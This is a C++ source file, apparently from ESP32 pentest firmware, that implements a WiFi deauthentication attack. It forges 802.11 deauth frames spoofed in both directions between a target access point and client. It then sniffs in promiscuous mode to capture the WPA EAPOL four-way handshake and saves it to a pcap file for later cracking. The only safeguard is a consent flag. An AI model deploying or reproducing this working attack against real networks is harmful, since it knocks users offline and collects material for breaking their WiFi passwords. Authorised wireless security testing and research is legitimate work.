#include "DeauthManager.h"
#include "../net/EapolWire.h"
#include "../core/Config.h"
#include "../storage/SdCard.h"
#include "../storage/PcapWriter.h"
#include <WiFi.h>
#include <esp_wifi.h>
#if __has_include(<esp_private/wifi.h>)
#include <esp_private/wifi.h>
#endif
#include <cstring>
#include <cstdlib>

DeauthManager g_deauthManager;

bool parseMacString(const String& s, uint8_t out[6]) {
    if (s.length() != 17) return false;
    for (int i = 0; i < 6; i++) {
        String byteStr = s.substring(i * 3, i * 3 + 2);
        char* endPtr = nullptr;
        long v = strtol(byteStr.c_str(), &endPtr, 16);
        if (endPtr == byteStr.c_str()) return false;
        out[i] = (uint8_t)v;
    }
    return true;
}

void DeauthManager::begin(QueueHandle_t outQueue) {
    _outQueue = outQueue;
}

bool DeauthManager::start(const String& apBssid, uint8_t channel, const String& clientMac) {
    if (_running) return false;
    // Defense in depth: DeauthScreen is only reachable through
    // OffensiveDisclaimerScreen, but never inject deauth frames unless
    // the per-boot offensive consent flag is actually set.
    if (!g_config.offensiveEnabled) return false;
    if (!parseMacString(apBssid, _apBssid) || !parseMacString(clientMac, _clientMac)) return false;

    _channel = channel;
    _framesSent = 0;
    _captured = 0;
    _m1Count = 0;
    _m2Count = 0;
    _m3Count = 0;
    _m4Count = 0;

    fs::FS& fs = sdcard::exportFs();
    fs.mkdir("/handshakes");
    String safeAp = apBssid;
    safeAp.replace(':', '-');
    String safeClient = clientMac;
    safeClient.replace(':', '-');
    _pcapPath = "/handshakes/" + safeAp + "_" + safeClient + "_" + String(millis() / 1000) + ".pcap";

    _captureQueue = xQueueCreate(kCaptureQueueDepth, sizeof(CapturedFrame));
    if (!_captureQueue) return false;

    _running = true;
    notify("starting deauth burst against " + clientMac);
    if (xTaskCreatePinnedToCore(&DeauthManager::taskEntry, "deauth", 8192, this, 1, nullptr, 0) != pdPASS) {
        // Task never started (out of memory) - unwind the queue and the
        // running flag so the UI doesn't sit on a dead session.
        _running = false;
        vQueueDelete(_captureQueue);
        _captureQueue = nullptr;
        notify("start failed - out of memory");
        return false;
    }
    return true;
}

void DeauthManager::taskEntry(void* arg) {
    static_cast<DeauthManager*>(arg)->run();
    vTaskDelete(nullptr);
}

void DeauthManager::run() {
    // Locks the radio onto the target AP's channel for the duration of
    // this run — necessarily disrupts this device's own WiFi STA
    // connection (which may be on a different channel/network entirely)
    // for as long as the deauth+capture takes. Expected, documented
    // side effect, not a bug — the STA reconnects on its own once this
    // finishes and promiscuous mode is switched back off.
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);

    for (uint8_t i = 0; i < kDeauthBurst / 2; i++) {
        if (sendDeauth(_clientMac, _apBssid, _apBssid)) _framesSent++;   // "from AP" to client
        delay(30);
        if (sendDeauth(_apBssid, _clientMac, _apBssid)) _framesSent++;  // "from client" to AP
        delay(30);
    }
    notify(String(_framesSent) + " deauth frames sent, capturing handshake...");

    esp_wifi_set_promiscuous_rx_cb(&DeauthManager::promiscuousRxTrampoline);
    esp_wifi_set_promiscuous(true);

    fs::FS& fs = sdcard::exportFs();
    File f = fs.open(_pcapPath, "w");
    bool haveFile = (bool)f;
    if (haveFile) pcap::writeGlobalHeader(f);

    uint32_t start = millis();
    CapturedFrame frame;
    while (_running && (millis() - start) < kCaptureWindowMs) {
        if (xQueueReceive(_captureQueue, &frame, pdMS_TO_TICKS(50)) == pdTRUE) {
            _captured++;
            if (haveFile) pcap::writeRecord(f, frame.data, frame.capturedLen, frame.originalLen);
        }
    }

    esp_wifi_set_promiscuous(false);
    if (haveFile) f.close();
    vQueueDelete(_captureQueue);
    _captureQueue = nullptr;

    notify(handshakeLikelyCaptured() ? "handshake likely captured!" : "capture done, no full handshake seen");
    _running = false;
}

bool DeauthManager::sendDeauth(const uint8_t dst[6], const uint8_t src[6], const uint8_t bssid[6]) {
    uint8_t frame[26];
    frame[0] = 0xC0;  // type=Management, subtype=Deauthentication
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;  // duration
    memcpy(frame + 4, dst, 6);
    memcpy(frame + 10, src, 6);
    memcpy(frame + 16, bssid, 6);
    frame[22] = 0x00;
    frame[23] = 0x00;  // seq control - driver fills this in (en_sys_seq = true below)
    frame[24] = 0x01;
    frame[25] = 0x00;  // reason code 1 = "Unspecified reason", LE

    return esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true) == ESP_OK;
}

void DeauthManager::promiscuousRxTrampoline(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Same real build fix as ArpSpoofManager.cpp: the parameter type
    // must match wifi_promiscuous_cb_t exactly (not int), and the
    // packet-type filter uses the named enum constants rather than
    // guessed ordinals - see that file's comment for the full story.
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    if (!pkt) return;
    g_deauthManager.onCapturedFrame(pkt->payload, pkt->rx_ctrl.sig_len);
}

void DeauthManager::onCapturedFrame(const uint8_t* p, uint16_t len) {
    if (len < 22 || !_captureQueue) return;

    const uint8_t* addr1 = p + 4;
    const uint8_t* addr2 = p + 10;
    const uint8_t* addr3 = p + 16;

    bool involvesTarget = memcmp(addr1, _apBssid, 6) == 0 || memcmp(addr2, _apBssid, 6) == 0 ||
                           memcmp(addr3, _apBssid, 6) == 0 || memcmp(addr1, _clientMac, 6) == 0 ||
                           memcmp(addr2, _clientMac, 6) == 0;
    if (!involvesTarget) return;

    // Structural read-out on the FULL frame, before the 256-byte
    // truncation below. See net/EapolWire.h for exactly what is and
    // isn't read.
    eapol::Classification c = eapol::classify(p, len);
    switch (c.kind) {
        case eapol::MessageKind::Message1: _m1Count++; break;
        case eapol::MessageKind::Message2: _m2Count++; break;
        case eapol::MessageKind::Message3: _m3Count++; break;
        case eapol::MessageKind::Message4: _m4Count++; break;
        default: break;
    }

    CapturedFrame frame;
    frame.originalLen = len;
    frame.capturedLen = (len > sizeof(frame.data)) ? (uint16_t)sizeof(frame.data) : len;
    memcpy(frame.data, p, frame.capturedLen);
    xQueueSend(_captureQueue, &frame, 0);
}

void DeauthManager::notify(const String& text) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::Deauth;
    n.type = ScanEventType::LogLine;
    n.setText(text.c_str());
    xQueueSend(_outQueue, &n, 0);
}
